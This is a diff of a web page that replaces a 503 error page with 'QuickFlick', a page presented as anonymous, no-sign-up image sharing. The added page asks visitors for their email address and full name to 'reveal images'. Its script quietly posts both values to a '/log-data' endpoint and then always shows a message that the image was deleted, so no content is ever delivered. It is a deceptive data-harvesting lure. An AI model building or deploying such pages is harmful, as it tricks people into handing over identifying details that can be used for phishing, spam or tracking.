@@ -1,99 +1,145 @@
-<script type="text/javascript">
-        var gk_isXlsx = false;
-        var gk_xlsxFileLookup = {};
-        var gk_fileData = {};
-        function filledCell(cell) {
-          return cell !== '' && cell != null;
-        }
-        function loadFileData(filename) {
-        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
-            try {
-                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
-                var firstSheetName = workbook.SheetNames[0];
-                var worksheet = workbook.Sheets[firstSheetName];
-
-                // Convert sheet to JSON to filter blank rows
-                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
-                // Filter out blank rows (rows where all cells are empty, null, or undefined)
-                var filteredData = jsonData.filter(row => row.some(filledCell));
-
-                // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
-                var headerRowIndex = filteredData.findIndex((row, index) =>
-                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
-                );
-                // Fallback
-                if (headerRowIndex === -1 || headerRowIndex > 25) {
-                  headerRowIndex = 0;
-                }
-
-                // Convert filtered JSON back to CSV
-                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
-                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
-                return csv;
-            } catch (e) {
-                console.error(e);
-                return "";
-            }
-        }
-        return gk_fileData[filename] || "";
-        }
-        </script><!DOCTYPE html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>quickflick post images online anonymously</title>
+    <meta name="description" content="QuickFlick - Share and reveal images anonymously, no sign-up required.">
+    <title>QuickFlick - Reveal Images</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
+        * {
             margin: 0;
-            background-color: #f5f5f5;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f4f7fa;
+            color: #333;
+            line-height: 1.6;
+        }
+        .header {
+            background-color: #2c3e50;
+            color: white;
+            padding: 20px;
+            text-align: center;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+        .header h1 {
+            font-size: 2em;
+            letter-spacing: 2px;
+        }
+        .header .logo {
+            font-weight: bold;
+            color: #e74c3c;
         }
         .container {
-            text-align: center;
-            padding: 40px;
-            background-color: #fff;
-            border-radius: 8px;
-            box-shadow: 0 0 15px rgba(255, 0, 0, 0.1);
-            border: 2px solid #ff3333;
+            max-width: 600px;
+            margin: 50px auto;
+            padding: 30px;
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
         }
-        h1 {
-            color: #ff3333;
-            font-size: 2.5em;
-            margin-bottom: 10px;
-        }
-        p {
-            color: #666;
-            font-size: 1.2em;
+        .form-section h2 {
+            color: #2c3e50;
             margin-bottom: 20px;
-        }
-        .error-code {
-            font-size: 6em;
-            color: #ff6666;
-            font-weight: bold;
-            margin: 0;
-        }
-        .link-header {
             font-size: 1.5em;
-            color: #ff4444;
-            text-decoration: none;
-            font-weight: bold;
         }
-        .link-header:hover {
-            text-decoration: underline;
-            color: #cc0000;
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        .form-group label {
+            display: block;
+            font-weight: 500;
+            margin-bottom: 5px;
+            color: #7f8c8d;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 1em;
+            transition: border-color 0.3s;
+        }
+        .form-group input:focus {
+            border-color: #3498db;
+            outline: none;
+        }
+        .reveal-button {
+            background-color: #3498db;
+            color: white;
+            padding: 12px 30px;
+            border: none;
+            border-radius: 5px;
+            font-size: 1em;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        .reveal-button:hover {
+            background-color: #2980b9;
+        }
+        .deleted-message {
+            display: none;
+            text-align: center;
+            padding: 20px;
+            background-color: #ffebee;
+            border: 1px solid #ef5350;
+            border-radius: 5px;
+            color: #ef5350;
+            font-size: 1.2em;
+        }
+        .footer {
+            text-align: center;
+            padding: 20px;
+            color: #7f8c8d;
+            font-size: 0.9em;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="error-code">503</div>
-        <h1>Service Unavailable</h1>
-        <p>Thank you for visiting! We're excited to have you here, but our site is currently unavailable. Please check back soon.</p>
-       
+    <div class="header">
+        <h1>QuickFlick <span class="logo">Image Sharing</span></h1>
     </div>
+    <div class="container">
+        <div id="form-section" class="form-section">
+            <h2>Enter Email and Name to Reveal Images</h2>
+            <p style="margin-bottom: 20px; color: #7f8c8d;">No sign-up required – access your content instantly!</p>
+            <div class="form-group">
+                <label for="email">Email Address</label>
+                <input type="email" id="email" name="email" required>
+            </div>
+            <div class="form-group">
+                <label for="name">Full Name</label>
+                <input type="text" id="name" name="name" required>
+            </div>
+            <button class="reveal-button" onclick="revealImages()">Reveal Images</button>
+        </div>
+        <div id="deleted-section" class="deleted-message">
+            <p>This image has been deleted or is no longer available.</p>
+        </div>
+    </div>
+    <div class="footer">
+        <p>© 2025 QuickFlick. All rights reserved. | <a href="/privacy" style="color: #3498db; text-decoration: none;">Privacy Policy</a></p>
+    </div>
+
+    <script>
+        function revealImages() {
+            const email = document.getElementById('email').value;
+            const name = document.getElementById('name').value;
+
+            // Log data to server
+            fetch('/log-data', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ email, name })
+            }).catch(error => console.error('Error logging data:', error));
+
+            // Hide form, show deleted message
+            document.getElementById('form-section').style.display = 'none';
+            document.getElementById('deleted-section').style.display = 'block';
+        }
+    </script>
 </body>
 </html>
